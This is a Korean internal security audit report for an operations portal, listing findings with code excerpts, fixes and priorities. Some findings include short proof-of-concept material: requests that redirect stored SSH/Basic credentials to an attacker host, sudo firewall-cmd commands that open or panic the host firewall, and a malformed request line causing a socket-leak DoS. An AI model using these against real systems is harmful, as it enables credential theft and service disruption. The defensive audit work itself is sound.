# 보안 취약점 점검 — The.DVC v2.487.0 (2026-09-12)

> 방식: 7개 보안 차원(① 인증/RBAC/scope · ② 인젝션/경로/아카이브/SQL/CSV · ③ SSRF/아웃바운드/TLS/자격증명 · ④ 중앙↔엣지 신뢰경계/업그레이드 공급망 · ⑤ 웹 프론트/세션/HTTP 헤더 · ⑥ 암호/시크릿/CI·공급망 · ⑦ DoS/자원/원격실행)을 **읽기 전용** 다중 에이전트로 병렬 감사한 뒤, 각 후보를 **코드로 재검증**하고 일부는 로컬 격리 환경에서 **PoC 재현**해 확정했다. 대상 커밋: `233559b`(feat/dvc-console, v2.487.0), 기반 `c650240`(v2.486.0). 저장소 파일은 감사 중 **수정하지 않았다**.
> 성격: 사내 단일테넌트 운영 포탈. 신뢰경계 = "포탈 권한 계정(viewer→operator→admin→설정소유자) · 침해된 개별 엣지 토큰 · WAN/프록시 경로" → 중앙 데이터/원격 인프라/자격증명.
> 직전 감사: `security_check_20260809.MD`, `docs/AUDIT-2026-08-17.md`, `docs/AUDIT-2026-09-11*.md`.

## 요약

| 심각도 | 건수 | 비고 |
|---|---|---|
| Critical | **0** | RCE·무인증 자격증명 유출·영구 상태 파괴 경로 없음 |
| High | **2** | H-1 register-collector agent 바인딩 우회, H-2 remote/test 저장 자격증명 host 바꿔치기 유출 |
| Medium | **6** | M-1 WS upgrade 소켓 누수(회귀·PoC 재현) · M-2 /api/ping scope 미적용 · M-3 packages baseUrl SSRF · M-4 스토리지/SAN REST TLS 검증 불가 · M-5 firewall-cmd 인자 무제한 sudo · M-6 Node 런타임 22.20.0 고정(High CVE 3건 경로 해당) |
| Low | **9** | 압축폭탄·CSV 수식·CSP·서버측 로그아웃·WS 토큰 쿼리스트링·RDP 세션 상한·verifyPassword 빈해시·gitignore 시크릿·런타임 DB 추적 |
| Info/개선 | 다수 | CI npm ci·Actions SHA 고정·d3-color override 등 |

**확정 High 2건은 모두 admin(H-2) 또는 침해 개별 엣지 토큰(H-1) 을 전제**로 하며, 영향은 자격증명 유출·데이터 위장이다. 무인증으로 닿는 것은 M-1(소켓 누수 DoS) 하나다.

핵심 원인 3가지: (a) `requestedAgent()` 의 OR 단락 순서(H-1 — CLAUDE.md `central.js:12` 가 경고한 바로 그 클래스), (b) v2.480 "연결 테스트 시 host/url 저장값 고정" 규칙이 `remote.js` 에만 미적용(H-2), (c) WS upgrade 의 `new URL()` 예외가 catch-all 소켓 파기를 건너뛰게 함(M-1 — 2026-08-17 #7 의 부분 회귀).

---

## 확정 취약점

### H-1 [HIGH · CWE-290/639] `/api/central/register-collector` agent 바인딩 우회 → 타 엣지 수집서버 URL·토큰 탈취 → 중앙 자격증명 유출 피벗
- **위치**: `server/src/routes/central.js:136-139`
  ```js
  const requestedAgent = (req) => String(
    req.query?.agent || req.get('X-Agent-Name') || req.body?.agent
    || (req.path === '/register-collector' ? req.body?.name : '') || '',
  ).trim();
  ```
- **원리**: 바인딩 미들웨어(`:146-151`)는 `requestedAgent(req)` 가 토큰의 agent 와 다르면 403 이다. 그런데 `/register-collector` 의 실제 저장 키는 `body.name`(`:202,289 addCollector`)인데, `requestedAgent` 는 OR 체인에서 `X-Agent-Name`/`?agent=`/`body.agent` 중 **하나라도 있으면** 뒤의 `body.name` 을 보지 않는다. 침해 엣지 A(유효 개별 토큰)가 `X-Agent-Name: A`(자기 이름 → 미들웨어 통과) + `{name:"B", urlHint, collectorToken}` 를 보내면 **엣지 B 의 수집서버 항목**을 자기가 통제하는 URL·토큰으로 덮어쓴다.
- **재현**(격리 config): `X-Agent-Name:edgeA` + `{name:"edgeB",...}` → 200(탈취), 헤더 없이 `name:edgeB` 만 → 403. 즉 헤더 하나로 403→200.
- **피벗 영향(HIGH 근거)**: 중앙은 수집서버 URL 로 **자격증명을 실어 아웃바운드 호출**한다 — `central/idracScanPush.js:48`(iDRAC user/pw), `bmstor/poller.js:65`(SSH user/pw). URL 을 공격자 서버로 바꾸면 관리자가 입력한 iDRAC/SSH 자격증명이 공격자에게 전송된다. `CENTRAL_VERIFY_SELF_REGISTER` ping 검증도 URL·토큰·identity 응답을 공격자가 통제하므로 우회된다(단 `managed=true` 항목은 보호).
- **전제**: 개별 토큰을 가진 침해 엣지 1대(공유 CENTRAL_TOKEN 아님).
- **수정**: `register-collector` 진입에서 agent 모드면 `norm(body.name) !== norm(centralAuth.agent)` → 403 으로 **body.name 을 유일 바인딩 키로 직접 강제**(헤더 우선순위 제거). 회귀 테스트 추가.

### H-2 [HIGH · CWE-522/918] `POST /api/remote/test`·`/api/remote/deploy/test` — `********` 로 저장 비밀번호·SSH 개인키를 물려받으면서 url/host 는 요청값 → 저장 자격증명을 임의 호스트로 유출
- **위치**: `server/src/routes/remote.js:164-178`
  ```js
  const dp = { ...proxy.dataplane, ...((req.body||{}).dataplane||{}) };
  if (dp.password === '********') dp.password = proxy.dataplane.password;   // dp.url 은 body 값 그대로
  res.json(await testDataplane(dp));
  ...
  const dep = { ...proxy.deploy, ...((req.body||{}).deploy||{}) };
  if (dep.password === '********') dep.password = proxy.deploy.password;
  if (dep.privateKey === '********') dep.privateKey = proxy.deploy.privateKey; // dep.host 는 body 값 그대로
  ```
- **전송 경로**: `proxy/dataplane.js:20` 이 `Authorization: Basic base64(user:pw)` 를 `dp.url` 로(SSRF 가드 없음), `proxy/deploy.js:82-86` 이 `withSsh({host: dep.host, password, privateKey})` 로 접속(`ipBlockReason` 없음).
- **PoC**(admin):
  ```
  POST /api/remote/test  {"proxyId":"default","dataplane":{"url":"http://10.9.9.9:5555","username":"dpapi","password":"********"}}
   → 10.9.9.9 가 Basic(dpapi:<저장 평문 비번>) 수신
  POST /api/remote/deploy/test  {"proxyId":"default","deploy":{"host":"10.9.9.9","username":"root","password":"********","privateKey":"********"}}
   → 공격자 sshd 가 저장된 root 비번/개인키 수신
  ```
  `GET /remote/config` 의 `********` 마스킹이 이 경로로 무력화 = RDP/SSH 게이트웨이 프록시 서버(root) 장악.
- **전제**: admin(`requireRole('admin')`; 설정 소유자 불필요). v2.480 이 vCenter/NSX/Horizon/iDRAC/collectors/SMTP/PDU/SAN/스토리지/GPU 에 적용한 "비밀 상속 시 host/url 저장값 고정" 규칙(CLAUDE.md `server/CLAUDE.md:67`, 2026-09-11c I1 공용 헬퍼)이 **remote.js 에만 누락**.
- **수정**: 플레이스홀더로 저장 비밀을 쓰면 `dp.url`/`basePath`, `dep.host`/`port` 를 저장값으로 강제. 새 url/host 시험은 비밀 재입력 요구. `dp.url` 에 `ssrfBlockReasonResolved`, `dep.host` 에 `ipBlockReason`. 회귀 테스트.

### M-1 [MEDIUM · CWE-248/400] WebSocket upgrade 의 `new URL(req.url)` 미보호 — 잘못된 요청줄 예외로 catch-all 소켓 파기가 건너뛰어져 무인증 FD 누수 (2026-08-17 #7 부분 회귀) — **PoC 재현 성공**
- **위치**: `server/src/proxy/sshGateway.js:27-28`, `server/src/proxy/guacdTunnel.js:50-51`(둘 다 `new URL(req.url,'http://localhost')` 를 try 없이), `server/src/index.js:307-311`(catch-all 은 **세 번째** 리스너), `:6-9`(`uncaughtException` 는 "계속 실행").
- **원리**: `GET //[ HTTP/1.1` 같은 요청줄은 `req.url='//['` 로 전달 → 첫 upgrade 리스너의 `new URL('//[')` 가 `TypeError: Invalid URL` throw → EventEmitter 는 동기 throw 시 **나머지 리스너를 호출하지 않음** → guacd 리스너·index.js catch-all 모두 미실행 → 소켓이 어느 쪽도 `destroy()` 하지 않아 열린 채 잔존(upgrade 분기라 keepAliveTimeout 미적용).
- **재현**(동일 리스너 구조 로컬): baseline `/nope` → 소켓 종료·serverConnections=0. attack `//[` → `uncaughtException: Invalid URL` + **clientClosed=false, serverConnections=1, catchAllCalls=1**(공격 요청은 카운트 증가 없음 = catch-all 미도달). 반복 시 FD 상한까지 무인증 점유 + 요청당 스택트레이스가 로그 링버퍼 적재.
- **전제**: 무인증(포트 도달만).
- **수정**: 두 게이트웨이의 URL 파싱을 try/catch 로 감싸 실패 시 `socket.destroy()` 후 return(또는 `req.url.split('?')[0]` 로 pathname 먼저 비교). catch-all 을 **첫 번째** upgrade 리스너로 이동해 순서 의존 제거. `test/securityAudit2026-08-17.test.js` 에 `//[` 케이스 추가.

### M-2 [MEDIUM · CWE-639/200] `/api/ping` 조회 라우트 scope 미적용 — 범위 제한 계정이 전 vCenter 관리 호스트·이름·응답시간 열람
- **위치**: `server/src/routes/ping.js:52`(`/status`), `:56`(`/targets`), `:58`(`/series`), `:101`(`/vcport/overview`). 마운트 `index.js:181` 은 `authMiddleware, requireEnrolled, auditMiddleware` 만(권한·scope 없음). 타깃 내용 `ping/store.js:152`: `{id:'vc_'+vcId, name: vc.name, host: hostFromUrl(vc.host), port:443}` = vCenter 관리 호스트/IP.
- **PoC**(scope 제한 viewer): `GET /api/ping/targets` → 범위 밖 vCenter 이름·호스트 목록; `GET /api/ping/series?id=vc_<밖>&range=7d` → RTT 시계열.
- **대조**: 동일 정보를 다루는 `/tools/network-check` 는 2026-08-17 #4 에서 scope 를 걸었다. CLAUDE.md "조회 라우트 scope 는 예외 없이" 위반.
- **수정**: `scopedVcenterIds` non-null 이면 `source==='vcenter'` 타깃은 허용 vCenter 만(`/targets`·`/status`), `/series` 는 `vc_` 접두 범위 밖이면 404, `/vcport/overview` 는 그룹 키 교집합. `requirePerm('dashboard')` 게이트 추가 권장. (엣지 노드 타깃은 vCenter 귀속 없음 → 무귀속 규칙상 범위 계정에 숨김이 맞음.)

### M-3 [MEDIUM · CWE-918] `GET /api/admin/packages?baseUrl=` · `POST /api/admin/packages/download {baseUrl}` — 무검증 URL fetch 후 응답 반환(full-read SSRF)
- **위치**: `server/src/routes/admin/deployLlm.js:33-38,44-47` → `upgrade/fetchPackage.js:18-24,43-65`(`resilientFetch(${base}/versions.json)` 후 `res.json()` 을 그대로 반환). `routes/upgrade.js:55 urlReason` 은 업그레이드 remoteBase 에만 적용, `packageSettings.js` 저장·즉석 baseUrl 은 미검사(2026-08-09 I-R2 후속 잔존).
- **PoC**(admin): `GET /packages?baseUrl=http://127.0.0.1:4000/api` → 루프백 응답 본문 반환. admin 은 이미 번들 업로드 권한이 있어 권한상승은 아니나 내부망 프로브·응답 유출.
- **수정**: `fetchRemoteVersions`/`downloadPackage`/`savePackageSettings` 에 `ssrfBlockReasonResolved`, 응답 `remote` 는 스키마만 추려 반환.

### M-4 [MEDIUM · CWE-295] 스토리지·SAN 스위치 REST 수집기 TLS 검증 무조건 해제(켜는 스위치 없음)
- **위치**: `server/src/sanswitch/collectors/fosRest.js:24`, `storage/collectors/restCommon.js:9`, `storage/collectors/isilon.js:19` — 모두 `new Agent({connect:{rejectUnauthorized:false}})` 이고 env 옵트인 없음. Basic 자격증명이 무검증 TLS 로 전송된다. 대조: `horizon/horizon.js:23` 은 `HORIZON_TLS_VERIFY` 로 켤 수 있다.
- **영향**: 사내망 MITM 시 어레이/SAN 관리자 자격증명 수집. vCenter/NSX/Horizon/iDRAC/업그레이드/SMTP/AD 는 검증을 켤 수 있는데 이 3개만 방법이 없다.
- **수정**: `STORAGE_TLS_VERIFY`/`SANSWITCH_TLS_VERIFY`(또는 장비별 `tlsVerify`) 도입.

### M-5 [MEDIUM · CWE-250/269] 호스트 접근 제어 sudoers — 인자 제한 없는 `firewall-cmd` NOPASSWD (v2.485 신규)
- **위치**: `packaging/offline/install.sh:207`, `server/src/hostaccess/service.js:23` — `%s ALL=(root) NOPASSWD: /usr/bin/firewall-cmd`(인자 무제한). 같은 파일 RMA·sshd 규칙(`install.sh:189-197,208`)은 `systemctl <verb> <unit>.service` 로 argv 를 고정하는데 이 줄만 열려 있다.
- **전제**: 서비스 계정(`vmportal`) 코드 실행(포탈 RCE, RMA 에이전트 침해).
- **PoC**: `sudo -n /usr/bin/firewall-cmd --set-default-zone=trusted` / `--direct --passthrough ipv4 -I INPUT -j ACCEPT` / `--panic-on`(DoS). 호스트 방화벽 정책 전체 장악(= v2.485 기능이 막으려는 것 자체).
- **관련 F2(하드닝 회귀 위험)**: 본체 유닛 `vmware-portal.service:29 NoNewPrivileges=true` 이면 `hostaccess/exec.js:27` 의 `sudo -n` 이 root 전환에 실패(setuid 무시)해 기능이 안 돈다. `isSudoDenied`(`exec.js:35`)가 `no new privileges` 메시지를 인식 못 하고 문서/화면은 "sudoers 추가"만 안내 → 운영자가 NNP 를 끄는 방향으로 '고쳐' M-5 규칙이 활짝 열릴 위험(RMA 유닛이 같은 이유로 `NoNewPrivileges=false` 를 명시).
- **수정**: 서브커맨드 화이트리스트 래퍼(root 소유 0755)만 sudoers 허용, 또는 firewalld D-Bus+polkit(필요 메서드만). 본체 NNP 유지 + 최소권한 헬퍼 유닛으로 위임. `isSudoDenied` 에 NNP 패턴 추가.

### M-6 [MEDIUM · CWE-1104] 배포 Node.js 런타임 22.20.0 고정 — 22.x 보안 릴리스 4개(High CVE 5건) 뒤처짐
- **위치**: `.github/workflows/release.yml:26 NODE_VERSION:'22.20.0'`, `packaging/offline/build-package.sh:25`, `packaging/windows/build-collector-win.sh:20`. 22.x 최신 = **v22.23.2(2026-07-28)**.
- **코드 경로에 걸리는 High**: CVE-2026-21710(http 서버 `headersDistinct` 프로토타입 — Express 유입 전 요청), CVE-2026-48618(TLS 서버 신원 검사 정규화 — 아웃바운드 vCenter/NSX/미러), CVE-2026-48934(TLS 세션 재사용 바인딩). 그 외 http2/permission/zlib CVE 다수(대부분 미사용 기능). RCE PoC 는 없으나 실제 코드 경로에 걸린다.
- **수정**: 3곳 `NODE_VERSION` 을 릴리스 시점 22.x 최신(현재 22.23.2)으로 인상 + Windows 문서/zip 이름 갱신. **오프라인 패키지·수집기 재빌드·재배포 필요**(자동 업그레이드 번들 `vmware-portal-<v>.tar.gz` 는 앱만 교체하고 런타임은 안 바꾼다).

---

## Low (요약 — 상세는 scratchpad/audit/*.md)

| # | CWE | 항목 | 위치 | 조치 |
|---|---|---|---|---|
| L-1 | 409 | 업그레이드 아카이브 압축폭탄(gunzip/inflate `maxOutputLength` 없음, raw limit 256mb > 200MB) | `upgrade/archive.js:63,102`·`routes/upgrade.js:188`·`collector.js:200` | `maxOutputLength: MAX_BUNDLE_BYTES` + raw limit 축소(admin 전제라 Low) |
| L-2 | 1236 | 중계 토폴로지 CSV 수식 인젝션 가드 누락(다른 12개 빌더는 `guardCell` 적용) | `relaytopo/store.js:169` | `util/csv.js csvLine`/`guardCell` 로 교체 |
| L-3 | 598 | WS SSH/RDP 가 세션 JWT 를 **쿼리스트링**으로 전송(RDP 자격증명은 티켓화됐으나 세션 토큰은 여전히 URL) | `web/src/remote/RemoteConsole.jsx:53,172`·`sshGateway.js:42`·`guacdTunnel.js:58` | WS 접속 티켓 또는 `Sec-WebSocket-Protocol: bearer.<t>` 서브프로토콜, 쿼리 폴백 제거 |
| L-4 | 613 | 서버측 로그아웃 부재 — 로그아웃 후에도 토큰이 TTL(8h) 유효 | `web/src/App.jsx:126`, `routes/auth.js`(라우트 없음) | `POST /auth/logout` + sid 해제/폐기목록 |
| L-5 | 1021/693 | Node 포탈 CSP 기본 비활성(env 옵트인) — XSS 심층방어 없음(pyportal 은 강제) | `server/src/index.js:110,119` | 기본 CSP 도입(옵트아웃으로 전환) |
| L-6 | 770/400 | RDP WS 게이트웨이에 동시 세션 상한·유휴 타이머 없음(SSH 는 80/30분) + quick-connect 매핑/포트/RDP 티켓 사용자당 상한 없음 + RMA heartbeats 무기한 누적(delete 0건) + alerts.js tick 재진입 가드 없음 | `guacdTunnel.js`·`remote.js:208`·`rdpTicket.js:27`·`rma/jobs.js:35`·`alerts.js:333` | 공용 세션 예산·유휴 종료·사용자당 상한·heartbeats 만료·`ticking` 플래그 |
| L-7 | 287/697 | `verifyPassword` 가 길이 0 해시(`scrypt$salt$`)를 모든 비밀번호와 일치로 판정 | `auth/auth.js:26-36` | scheme/salt(32)/hash(128) 길이 검증 후 비교, `applyManagedUsers`(`:543`)도 해시 형식 검증. 정상 UI 경로는 128hex 생성이라 미도달 — 전제는 중앙 pull/백업 복원의 임의 해시 주입(**추정**, central pull 확인 권장) |
| L-8 | 540/312 | `.gitignore` 가 SECRET_FILES 3종(`pdu-devices.json`·`relay-topology.json`·`mail.json`) + `active-sessions.json`·`portal.env` 미무시 | `.gitignore` | 항목 추가 + `server/config/*` 무시 + `!*.example.json` 예외 구조, `SECRET_FILES ⊆ .gitignore` 테스트 |
| L-9 | 538/1188 | 런타임 파일 git 추적/미무시: `capacity.db`(1.4MB, 개발 PC hostname 포함) 추적, `guest-disk.db`·`vm-track.db`·`vmperf/` 미무시; **커밋된 `ipam-scan.json` 이 `enabled:true`+192.168.1–4.0/24 스캔** → 기본 CONFIG_DIR 실행 시 부팅 30초 후 능동 포트 스캔(mock 로그 `[ipscan] poller started (enabled=true, ranges=4)` 로 실증. install.sh·Windows 는 CONFIG_DIR 분리라 영향 없음) | `.gitignore`·`server/config/*` | `git rm --cached` + `*.db`/`*.db-wal`/`*.db-shm`/`vmperf/` 무시, `ipam-scan.json` 제거 또는 `enabled:false`, `build-package.sh` 가 `*.example.json` 외 config 미복사 |

## 개선 권고 (Info)

- **의존성(운영)**: server `exceljs→uuid`(moderate)·web `d3-color`(high ReDoS)는 **취약 API 미도달로 수용**(exceljs 는 `uuidv4` 만; d3-color 는 상수 색). web `package.json` 에 `overrides: {"d3-color":"^3.1.0"}` 로 경고 제거 가능(빌드·지도·3D 화면 회귀 확인 후). dev 전용 critical/high(concurrently→shell-quote, vitest/vite/postcss/nanoid 등)는 운영 번들 미포함 + `vite --host` 로 dev 서버를 공유망에 안 띄우면 무영향 — `npm audit fix`(semver 내)로 정리 권장.
- **CI/공급망**: `release.yml:42` 이 `npm run install:all`(=`npm install`, lockfile 비강제) → **`npm ci`** 로. Actions `uses:` 메이저 태그(@v4/@v5) → **커밋 SHA 고정** + Dependabot/Renovate. `ci.yml:70-76` 은 prod critical 만 차단(high 는 정보) — dev 포함·high 가시화 권장.
- **미인증 노출 축소**: `/api/auth/config` 의 `initialPasswordFile`(절대 경로)은 불리언으로 대체 가능(계정명 유출은 아님 — 불변조건 준수).
- **RMA `/tools/rma/run`**: adminOnly·OTP 재인증 없음(설계). hostaccess 처럼 `requireOwnOtp` 부여는 정책 판단.

---

## 확인된 양호한 방어 (코드로 확인 — 되돌리지 말 것)

- **인증/토큰**: HS256 HMAC + `timingSafeEqual`, alg 헤더 미신뢰; `verifyToken` 직접호출은 `/auth/extend` 1곳뿐(나머지 `resolveTokenUser` 단일 — tokenVersion·단일세션 sid·레코드 기준 role/scope/mustEnrollOtp). scrypt+16B 솔트+상수시간, 미존재 사용자 동일비용. TOTP 20B·±1창·minCounter 재사용 방지·잠금. 부트스트랩 3단계(미등록만 비번→requireEnrolled 차단→등록 시 passwordHash 삭제) 유지.
- **RBAC/scope**: 상태변경 ~330건 중 게이트 없는 것은 읽기성 4건뿐. `applyFilters(...,req.user)` 가 요청 필터보다 먼저, 단건 라우트 404 규약, `memoJson` 18곳 전부 `extraKey`(캐시 누수 회귀 없음). 도구별 거부목록 서버 집행. WS 게이트웨이 `resolveTokenUser`+`mustEnrollOtp`+`remote.access`+매핑 소유·scope 재검사.
- **인젝션/경로**: 로컬 `child_process` 전부 argv 배열+화이트리스트+셸 미경유, SSH 원격 명령은 화이트리스트 후 삽입·원격 출력 재검증, 경로 이탈 전 지점 basename/realpath/확장자 화이트리스트, SQLite 전량 바인딩(동적 ORDER BY 없음), XLSX 폭탄 가드(8MB/행·열 상한) 유지, CSV 수식 가드 12개 빌더 적용(누락 1곳 L-2).
- **SSRF/TLS/자격증명**: v2.480 host/url 저장값 고정이 vCenter/NSX/Horizon/iDRAC/collectors/SMTP/PDU/SAN/스토리지/GPU 에 적용(누락은 remote.js — H-2). `setGlobalDispatcher`·`NODE_TLS_REJECT_UNAUTHORIZED` 쓰기 0건, 업그레이드 전부 `upgradeAgent`(검증 강제), 비밀 응답/로그 redact 광범위, relaytopo host 변경 시 비밀 폐기.
- **중앙↔엣지/업그레이드**: 개별 토큰 SHA-256 해시·상수시간 비교, 업그레이드 sha256 이 자체/엣지push/수집기 3개 수신경로 모두 검증(부재 fail-closed), 아카이브 트래버설/심볼릭 가드, 소유권 필터(M-1/M-2/L-1 2026-08-09 조치 **회귀 없음**), collectedAt 수신시각 clamp.
- **웹/세션**: XSS 싱크는 Topology3D 1곳뿐 + `escHtml` 유지(H-R1 회귀 없음), 인증 순수 Bearer 헤더(쿠키 없음 → CSRF 불가), 보안 헤더(nosniff·XFO DENY·Referrer·HSTS)·CORS 기본 차단, `/dl/:file` 화이트리스트, pyportal 강한 CSP+Origin 검사+커스텀 헤더.
- **암호/시크릿/CI**: secretVault AEAD·봉인별 salt/IV·정책 fail-safe·복호 실패 재기록 금지, `atomicWriteFileSync` 0600, RMA/hostaccess sudoers argv 고정(firewall-cmd 제외 — M-5), 토큰·티켓 전부 `randomBytes`, Windows Node zip SHASUMS 검증 실제 실패, git 히스토리에 실제 비밀 리터럴 없음.

---

## 우선순위 조치 순서

1. **H-2 remote/test** — url/host 저장값 고정 + SSRF/IP 가드 + 회귀 테스트(가장 직접적인 자격증명 유출).
2. **H-1 register-collector** — body.name 유일 바인딩 강제.
3. **M-1 WS 소켓 누수** — try/catch + catch-all 리스너 우선순위(무인증 DoS).
4. **M-2 ping scope** · **M-3 packages SSRF** — 조회 경계.
5. **M-5 firewall-cmd sudo** + F2 NNP · **M-6 Node 22.23.2**.
6. Low 묶음: L-8/L-9(gitignore·ipam-scan.json·DB — 즉시·저위험·리뷰 쉬움) → L-1/L-2/L-4/L-5/L-6/L-7.
